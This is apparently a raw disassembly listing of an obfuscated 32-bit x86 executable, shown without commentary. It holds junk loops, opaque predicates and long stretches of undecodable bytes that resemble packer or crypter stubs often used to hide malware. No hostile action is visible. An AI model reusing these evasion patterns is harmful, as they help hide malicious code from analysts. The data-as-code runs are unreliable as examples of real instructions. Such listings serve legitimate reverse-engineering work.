  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0xee4f3ba4
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a3d
  401a76:	pop    ecx
  401a77:	or     al,0x66
  401a79:	lock inc ecx
  401a7b:	lahf   
  401a7c:	pusha  
  401a7d:	stos   BYTE PTR es:[edi],al
  401a7e:	jge    0x401abb
  401a80:	je     0x401ac6
  401a82:	jbe    0x401a71
  401a84:	jns    0x401afb
  401a86:	xchg   DWORD PTR [edx+0x55a65dcc],esp
  401a8c:	sub    eax,DWORD PTR [ecx+edi*2]
  401a8f:	jns    0x401a21
  401a91:	lea    esi,[ebx-0x26c26562]
  401a97:	iret   
  401a98:	in     al,0x41
  401a9a:	and    ebx,DWORD PTR [eax]
  401a9c:	call   0xdd09:0x860c31af
  401aa3:	leave  
  401aa4:	jl     0x401ad1
  401aa6:	pop    ebp
  401aa7:	ins    DWORD PTR es:[edi],dx
  401aa8:	mov    ecx,0xde185a41
  401aad:	loopne 0x401a2f
  401aaf:	push   ebp
  401ab0:	imul   edi,edx,0x58
  401ab3:	call   FWORD PTR [edi]
  401ab5:	out    dx,eax
  401ab6:	stc    
  401ab7:	cld    
  401ab8:	cvttps2pi mm3,QWORD PTR [ecx+0x3e]
  401abc:	mov    al,ds:0x491e1efd
  401ac1:	push   eax
  401ac2:	rcr    DWORD PTR [ebx+edi*1-0x6f480daf],0x1a
  401aca:	dec    esp
  401acb:	inc    esi
  401acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401acd:	dec    eax
  401ace:	fwait
  401acf:	rcl    BYTE PTR [ebx+0x3f455d62],0x45
  401ad6:	and    al,0xaa
  401ad8:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ada:	mov    eax,ds:0xef58d326
  401adf:	ret    
  401ae0:	sbb    bh,BYTE PTR [ecx]
  401ae2:	jbe    0x401a6a
  401ae4:	sbb    al,BYTE PTR [eax]
  401ae6:	call   0x206919dd
  401aeb:	sub    dl,bl
  401aed:	and    edx,DWORD PTR [esi+0x5f]
  401af0:	xchg   edi,eax
  401af1:	movntps XMMWORD PTR [edx+0x7fc55c50],xmm2
  401af8:	leave  
  401af9:	xor    al,0xc5
  401afb:	out    dx,al
  401afc:	mov    ds:0xfde5c764,al
  401b01:	dec    eax
  401b02:	fucomi st,st(5)
  401b04:	or     DWORD PTR [edx],0xffffffad
  401b07:	sub    edx,DWORD PTR [edi]
  401b09:	in     al,0xd7
  401b0b:	mov    edx,0x1e37deea
  401b10:	pop    ebp
  401b11:	push   edx
  401b12:	aad    0x85
  401b14:	out    0x6,eax
  401b16:	rol    DWORD PTR [esi-0x67d7ea82],1
  401b1c:	fiadd  DWORD PTR [eax-0x3d54b8ce]
  401b22:	sub    eax,0x142f5ee1
  401b27:	cmp    eax,0x66bb0241
  401b2c:	adc    al,0xca
  401b2e:	push   0xffffffbd
  401b30:	dec    edx
  401b31:	push   edx
  401b32:	mov    BYTE PTR [ecx-0x9580878],ch
  401b38:	sbb    dl,BYTE PTR [esi-0x5c]
  401b3b:	outs   dx,DWORD PTR ds:[esi]
  401b3c:	dec    esi
  401b3d:	pop    esi
  401b3e:	xchg   ebp,eax
  401b3f:	test   eax,0xa01f878f
  401b44:	push   eax
  401b45:	jne    0x401afe
  401b47:	icebp  
  401b48:	push   es
  401b49:	mov    al,ds:0x762abb06
  401b4e:	cmp    DWORD PTR gs:[ebx],esp
  401b51:	sbb    eax,DWORD PTR [edi+0x49b48c06]
  401b57:	fist   WORD PTR gs:[edi+0x5fa33429]
  401b5e:	dec    ecx
  401b5f:	dec    ebx
  401b60:	gs xchg edi,eax
  401b62:	mov    ds:0x7d8a036,al
  401b67:	in     eax,dx
  401b68:	add    ah,dl
  401b6a:	into   
  401b6b:	lods   eax,DWORD PTR ds:[esi]
  401b6c:	jge    0x401b40
  401b6e:	inc    ebp
  401b6f:	xchg   edx,eax
  401b70:	pop    ebp
  401b71:	pop    eax
  401b72:	ins    DWORD PTR es:[edi],dx
  401b73:	pop    eax
  401b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b75:	pop    ebx
  401b76:	rcr    cl,cl
  401b78:	pop    ss
  401b79:	scas   al,BYTE PTR es:[edi]
  401b7a:	jbe    0x401bd7
  401b7c:	xchg   ebp,eax
  401b7d:	add    BYTE PTR [edx],ah
  401b7f:	(bad)  
  401b80:	mov    esp,0x89dc2577
  401b85:	fidiv  DWORD PTR [ecx]
  401b87:	pop    ebp
  401b88:	icebp  
  401b89:	pop    edx
  401b8a:	sar    DWORD PTR [esi+ebp*8+0x22],cl
  401b8e:	in     al,0x38
  401b90:	(bad)  
  401b91:	sbb    BYTE PTR cs:[eax],cl
  401b94:	xchg   edi,eax
  401b95:	stos   BYTE PTR es:[edi],al
  401b96:	push   ecx
  401b97:	adc    al,0x19
  401b99:	sbb    eax,0x7d25a912
  401b9e:	daa    
  401b9f:	or     eax,0xcac8f0d0
  401ba4:	js     0x401c05
  401ba6:	jl     0x401baf
  401ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ba9:	shr    BYTE PTR [ebx*8+0xba5c052],0xb7
  401bb1:	cmp    ebx,DWORD PTR [edx+esi*8-0x24e85317]
  401bb8:	mov    ss,WORD PTR [eax+0x73]
  401bbb:	scas   al,BYTE PTR es:[edi]
  401bbc:	mov    ds:0x7c41b153,eax
  401bc1:	fadd   DWORD PTR [eax]
  401bc3:	xchg   edx,eax
  401bc4:	mov    dh,BYTE PTR [ecx+0xd]
  401bc7:	ret    
  401bc8:	inc    edi
  401bc9:	inc    esi
  401bca:	in     al,0x3e
  401bcc:	push   ss
  401bcd:	ret    
  401bce:	cmp    al,0x2e
  401bd0:	adc    eax,0x6d9c7131
  401bd5:	in     eax,dx
  401bd6:	ins    DWORD PTR es:[edi],dx
  401bd7:	leave  
  401bd8:	mov    edi,0x8ddd6676
  401bdd:	cli    
  401bde:	xor    DWORD PTR fs:[eax+0x2a780ac5],edx
  401be5:	xchg   ebp,eax
  401be6:	mov    eax,0x969116e2
  401beb:	dec    ebx
  401bec:	sbb    esp,DWORD PTR [eax]
  401bee:	in     al,dx
  401bef:	adc    DWORD PTR [ebx+0x6be91bd],ecx
  401bf5:	push   ebx
  401bf6:	loopne 0x401c2c
  401bf8:	bound  eax,QWORD PTR [ebp-0x4e]
  401bfb:	js     0x401bdd
  401bfd:	pop    ecx
  401bfe:	xchg   edx,eax
  401bff:	and    BYTE PTR [ecx+eax*1-0x28],dh
  401c03:	out    dx,eax
  401c04:	fistp  WORD PTR [edi]
  401c06:	mov    al,0xc2
  401c08:	pop    ss
  401c09:	sbb    DWORD PTR [edx+0x7e],eax
  401c0c:	nop
  401c0d:	jmp    0x4bb494b
  401c12:	dec    eax
  401c13:	pusha  
  401c14:	jnp    0x401c48
  401c16:	adc    ecx,DWORD PTR [esi]
  401c18:	cmp    DWORD PTR [esi-0xbba7215],ebp
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	adc    cl,BYTE PTR [ebx+0x18]
  401c93:	xor    BYTE PTR ds:0x7e7e,al
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c21
  401c9d:	add    ebx,ebp
  401c9f:	pushf  
  401ca0:	inc    esi
  401ca1:	je     0x401d0e
  401ca3:	jb     0x401cdc
  401ca5:	ret    0xeddb
  401ca8:	lods   al,BYTE PTR ds:[esi]
  401ca9:	sub    edx,DWORD PTR [eax+eiz*8]
  401cac:	cmp    al,0xa1
  401cae:	js     0x401cb5
  401cb0:	cmc    
  401cb1:	outs   dx,BYTE PTR ds:[esi]
  401cb2:	fs aaa 
  401cb4:	fmul   st,st(2)
  401cb6:	inc    edx
  401cb7:	adc    BYTE PTR [ebx],bl
  401cb9:	addr16 sub esi,ebp
  401cbc:	mov    ds:0x85cca131,al
  401cc1:	adc    DWORD PTR [ebp-0x5b],edx
  401cc4:	(bad)  
  401cc6:	xchg   ecx,eax
  401cc7:	out    dx,eax
  401cc8:	stos   DWORD PTR es:[edi],eax
  401cc9:	loope  0x401c5f
  401ccb:	mov    dh,0x99
  401cce:	add    eax,0x105f42ba
  401cd3:	fsub   QWORD PTR [ecx]
  401cd5:	push   ebx
  401cd6:	dec    edx
  401cd7:	mov    ebx,0x885f44d
  401cdc:	out    dx,al
  401cdd:	std    
  401cde:	sbb    dh,ch
  401ce0:	push   ebp
  401ce1:	lahf   
  401ce2:	sub    BYTE PTR [edx+0x52],0x82
  401ce6:	cmp    eax,0x8534c974
  401ceb:	stos   BYTE PTR es:[edi],al
  401cec:	ret    
  401ced:	(bad)  
  401cee:	cwde   
  401cef:	ret    
  401cf0:	sbb    al,0xa4
  401cf2:	(bad)  
  401cf3:	push   ss
  401cf4:	test   al,0x2b
  401cf6:	es jo  0x401ce3
  401cf9:	ins    BYTE PTR es:[edi],dx
  401cfa:	rcr    BYTE PTR [edi+0x4c7953ab],cl
  401d00:	pop    ds
  401d01:	rcr    cl,0x39
  401d04:	mov    eax,0x53b5370f
  401d09:	and    BYTE PTR [ecx],bh
  401d0b:	mov    DWORD PTR [ebp+0x65adaa8a],0x4dd9a799
  401d15:	leave  
  401d16:	loopne 0x401d7b
  401d18:	jno    0x401cd1
  401d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1b:	and    al,0x3e
  401d1d:	das    
  401d1e:	iret   
  401d1f:	mov    es,WORD PTR [ebx]
  401d21:	jns    0x401cd2
  401d23:	call   0x15f7:0xa97e3e1c
  401d2a:	sbb    ecx,ecx
  401d2c:	aam    0x8c
  401d2e:	push   ebx
  401d2f:	push   cs
  401d30:	sbb    BYTE PTR [ebx],cl
  401d32:	sbb    al,BYTE PTR [edx-0x3d]
  401d35:	lock loopne 0x401d11
  401d38:	or     eax,DWORD PTR [ebx-0x58]
  401d3b:	fidiv  WORD PTR [ebx+0x0]
  401d3e:	cmp    esi,DWORD PTR [ebx+0x3c5496fa]
  401d44:	or     DWORD PTR [ebp-0x79fa9ee1],esi
  401d4a:	inc    eax
  401d4b:	xchg   esi,eax
  401d4c:	mov    bl,0x9c
  401d4e:	aaa    
  401d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d50:	fsincos 
  401d52:	or     DWORD PTR [esi],edx
  401d54:	xchg   ebp,eax
  401d55:	xchg   edx,eax
  401d56:	mov    ds:0xce9e6308,eax
  401d5b:	fstp   st(2)
  401d5d:	sub    eax,0x29d9634e
  401d62:	test   al,0x84
  401d64:	mov    edx,0xdf38427a
  401d69:	cmp    BYTE PTR [ebx-0x4abf7e4f],0xbe
  401d70:	xchg   edx,eax
  401d71:	jmp    0x3c74:0xc0dd6a6f
  401d78:	mov    ebp,0x1a406b8b
  401d7d:	in     eax,dx
  401d7e:	test   al,0x49
  401d80:	mov    BYTE PTR [edi],al
  401d82:	ret    0x7629
  401d85:	test   eax,0xf971d732
  401d8a:	ins    DWORD PTR es:[edi],dx
  401d8b:	mov    gs:0x9a1b66c5,al
  401d91:	pop    edi
  401d92:	daa    
  401d93:	adc    ebp,DWORD PTR [eax+0x3e97f735]
  401d99:	fwait
  401d9a:	mov    ah,0xa5
  401d9c:	mov    ebp,0x1e7e29f6
  401da1:	xchg   BYTE PTR [edi+ebp*2+0x387295ef],bl
  401da8:	push   eax
  401da9:	(bad)  [eax-0xb]
  401dac:	jle    0x401dc4
  401dae:	pop    ss
  401daf:	loope  0x401d37
  401db1:	stos   DWORD PTR es:[edi],eax
  401db2:	add    BYTE PTR [edx+0x1b],cl
  401db5:	daa    
  401db6:	adc    al,al
  401db8:	(bad)  
  401db9:	fcomip st,st(1)
  401dbb:	add    bl,al
  401dbd:	xlat   BYTE PTR ds:[ebx]
  401dbe:	mov    ecx,0xf495de14
  401dc3:	xchg   esp,eax
  401dc4:	nop    DWORD PTR [esi-0x32]
  401dc8:	fld    DWORD PTR [ecx+0x76]
  401dcb:	arpl   WORD PTR [ebp+0x2c],cx
  401dce:	or     BYTE PTR [ecx],dh
  401dd0:	mov    ds,WORD PTR [ebx+edx*1-0x7e]
  401dd4:	fwait
  401dd5:	dec    ecx
  401dd6:	pushf  
  401dd7:	icebp  
  401dd8:	imul   edi,ebp,0xffffffe5
  401ddb:	cmp    DWORD PTR [edx+0x1f73425c],esi
  401de1:	nop
  401de2:	inc    esp
  401de3:	dec    esp
  401de4:	retf   
  401de5:	jle    0x401d78
  401de7:	ss jbe 0x401d9e
  401dea:	and    bh,BYTE PTR [edi+0x54]
  401ded:	sahf   
  401dee:	out    0xa,eax
  401df0:	add    eax,DWORD PTR [edx+0x1de31126]
  401df6:	push   eax
  401df7:	xor    bh,al
  401df9:	pop    ecx
  401dfa:	inc    esp
  401dfb:	popf   
  401dfc:	adc    DWORD PTR [edx-0x10],ecx
  401dff:	mov    edi,0x7519e64c
  401e04:	inc    edi
  401e05:	loopne 0x401dec
  401e07:	je     0x401e87
  401e09:	arpl   WORD PTR ds:0xb4c97680,bp
  401e0f:	add    esp,DWORD PTR [esi+eiz*2]
  401e12:	cs add bh,cl
  401e15:	push   ebp
  401e16:	fidivr WORD PTR [esi]
  401e18:	mov    bl,0x4b
  401e1a:	xor    dl,bh
  401e1c:	int    0x1f
  401e1e:	sub    al,ah
  401e20:	mov    eax,ds:0x99ae2cd9
  401e25:	jp     0x401e5b
  401e27:	lock sbb DWORD PTR [ecx+0xa86cba3],ebp
  401e2e:	sub    DWORD PTR [esi],esi
  401e30:	int    0xb9
  401e32:	cmp    DWORD PTR [ebx+0x22],edi
  401e35:	cmp    esp,DWORD PTR [edx+ebp*8+0x49ff9125]
  401e3c:	cli    
  401e3d:	imul   edx,DWORD PTR [edx],0x6e
  401e40:	in     al,0x2c
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	push   esp
  401e81:	popa   
  401e82:	stos   BYTE PTR es:[edi],al
  401e83:	lods   al,BYTE PTR ds:[esi]
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e20
  401e8d:	shr    DWORD PTR [edx+0x5ea60900],cl
  401e93:	aaa    
  401e94:	call   0xfc4f:0x820822f8
  401e9b:	shl    bl,1
  401e9d:	shl    DWORD PTR [ecx+0x19],1
  401ea0:	idiv   eax
  401ea2:	sahf   
  401ea3:	jo     0x401e65
  401ea5:	and    BYTE PTR [edi],0x3
  401ea8:	mov    ds:0x360f00d5,eax
  401ead:	jbe    0x401e83
  401eaf:	shl    esi,cl
  401eb1:	and    cl,BYTE PTR [ebx]
  401eb3:	mov    DWORD PTR [edi],edx
  401eb5:	mov    ds,WORD PTR [esi-0x5e81f167]
  401ebb:	stos   BYTE PTR es:[edi],al
  401ebc:	imul   esp,DWORD PTR [esi+0x6c],0xffffffab
  401ec0:	inc    edi
  401ec1:	xchg   ecx,eax
  401ec2:	scas   al,BYTE PTR es:[edi]
  401ec3:	ret    0x1093
  401ec6:	push   cs
  401ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ec8:	retf   
  401ec9:	shr    BYTE PTR [ebx+edx*4],0xc6
  401ecd:	nop
  401ece:	sahf   
  401ecf:	fcom   QWORD PTR [esi+0x71]
  401ed2:	seta   BYTE PTR [ebx-0x73]
  401ed6:	mov    ds:0xbce3894d,eax
  401edb:	js     0x401f39
  401edd:	sub    edx,0x4b3c9d89
  401ee3:	inc    ebx
  401ee4:	ret    
  401ee5:	inc    edi
  401ee6:	out    0x1a,eax
  401ee8:	(bad)  [edi+eax*8]
  401eeb:	cmp    eax,0xd547b2d0
  401ef0:	dec    ecx
  401ef1:	mov    eax,0xbfb94745
  401ef6:	mov    edx,0x38fd62a
  401efb:	add    eax,0xf2708a54
  401f00:	and    ebx,esi
  401f02:	and    BYTE PTR [ecx+edx*2],ch
  401f05:	shl    edi,cl
  401f07:	call   0x2e47:0x95a12d68
  401f0e:	adc    BYTE PTR [ebx-0x3a],dl
  401f11:	out    dx,eax
  401f12:	data16 (bad) 
  401f14:	in     eax,dx
  401f15:	lods   al,BYTE PTR ds:[esi]
  401f16:	xor    esp,DWORD PTR [edi]
  401f18:	mov    ds:0x4daf4808,al
  401f1d:	add    DWORD PTR [ebp-0x6ed7312c],0xfffffff2
  401f24:	cmp    DWORD PTR [edi-0x6f],esp
  401f27:	out    0xf5,eax
  401f29:	cwde   
  401f2a:	inc    ecx
  401f2b:	cs mov dh,0xd1
  401f2e:	adc    al,0x84
  401f30:	sub    BYTE PTR [ebx+0x71e1a762],ah
  401f36:	fcmovne st,st(0)
  401f38:	pop    esi
  401f39:	adc    DWORD PTR [edi-0x4e6b5a9d],eax
  401f3f:	mov    al,0x6
  401f41:	push   esp
  401f42:	out    dx,al
  401f43:	jb     0x401f78
  401f45:	out    dx,al
  401f46:	jp     0x401f81
  401f48:	test   BYTE PTR fs:[edx+0x6a],0x8e
  401f4d:	test   eax,0xba8921ce
  401f52:	retf   
  401f53:	(bad)  
  401f54:	mov    ah,0x19
  401f56:	inc    ebp
  401f57:	xchg   edx,eax
  401f58:	push   ds
  401f59:	sub    edi,DWORD PTR [ecx+esi*2-0xfbe1d93]
  401f60:	cmp    BYTE PTR [esi],ah
  401f62:	js     0x401f93
  401f64:	xor    ebp,DWORD PTR [edx]
  401f66:	dec    ecx
  401f67:	mov    al,ds:0xfdacde8b
  401f6c:	sub    edx,ebp
  401f6e:	pop    eax
  401f6f:	fisubr DWORD PTR [ebx+0x4cb6e071]
  401f75:	mov    edx,0x68831fb6
  401f7a:	pop    edx
  401f7b:	and    BYTE PTR [eax-0x7ceac76d],dh
  401f81:	sbb    al,0x53
  401f83:	loope  0x401f94
  401f85:	aad    0xe1
  401f87:	aas    
  401f88:	sbb    al,0x14
  401f8a:	push   ecx
  401f8b:	cmp    al,0x7e
  401f8d:	xor    esi,ebp
  401f8f:	lods   eax,DWORD PTR ds:[esi]
  401f90:	icebp  
  401f91:	js     0x401f90
  401f93:	jb     0x401ff9
  401f95:	call   0x75cd378f
  401f9a:	adc    dh,ah
  401f9c:	sub    eax,0x354cda0f
  401fa1:	fidiv  WORD PTR [edi+0x6f]
  401fa4:	shl    BYTE PTR [eax],1
  401fa6:	(bad)  
  401fa7:	fdivp  st(1),st
  401fa9:	cmc    
  401faa:	lods   al,BYTE PTR ds:[esi]
  401fab:	out    dx,al
  401fac:	(bad)  
  401faf:	add    ah,bh
  401fb1:	loopne 0x401f91
  401fb3:	add    edi,esp
  401fb5:	sti    
  401fb6:	pop    ebp
  401fb7:	mov    ah,0xce
  401fb9:	sub    al,0x5b
  401fbb:	test   BYTE PTR [ebp+0x14b817b8],0x18
  401fc2:	(bad)  
  401fc3:	cwde   
  401fc4:	ins    DWORD PTR es:[edi],dx
  401fc5:	pushf  
  401fc6:	imul   ebx,DWORD PTR [esi+0x21],0xf
  401fca:	jmp    0xe94d:0xcb8eecd4
  401fd1:	jl     0x401f7c
  401fd3:	mov    dl,0x17
  401fd5:	xor    bh,dl
  401fd7:	adc    BYTE PTR [ecx],0x13
  401fda:	(bad)  
  401fdb:	ss jl  0x402002
  401fde:	jle    0x40202d
  401fe0:	adc    eax,0xe35ae752
  401fe5:	stc    
  401fe6:	(bad)  
  401fe7:	and    al,0x8a
  401fe9:	dec    esp
  401fea:	scas   al,BYTE PTR es:[edi]
  401feb:	pop    esi
  401fec:	adc    eax,ebp
  401fee:	popa   
  401fef:	fidivr DWORD PTR [esi]
  401ff1:	shl    BYTE PTR [esi],1
  401ff3:	mov    eax,ds:0x3a9c50e4
  401ff8:	adc    ebp,0x0
  401ffb:	out    0x2f,eax
  401ffd:	mov    eax,0x173f358e
  402002:	dec    DWORD PTR [edi+0x38e6a74a]
  402008:	jbe    0x401fb7
  40200a:	cmp    ecx,DWORD PTR [ecx-0x3701abd5]
  402010:	inc    esi
  402011:	adc    eax,0x3e1846ad
  402016:	and    al,0x50
  402018:	adc    al,0xa2
  40201a:	es int3 
  40201c:	ja     0x401fbc
  40201e:	nop
  40201f:	(bad)  
  402020:	cwde   
  402021:	mov    ebp,cs
  402023:	test   BYTE PTR [ebp-0x5f],bh
  402026:	stos   BYTE PTR es:[edi],al
  402027:	pushf  
  402028:	shl    DWORD PTR [eax+0x7d3dc269],1
  40202e:	cmp    bl,BYTE PTR [ecx]
  402030:	(bad)  
  402031:	repz add eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	scas   eax,DWORD PTR es:[edi]
  4020e5:	std    
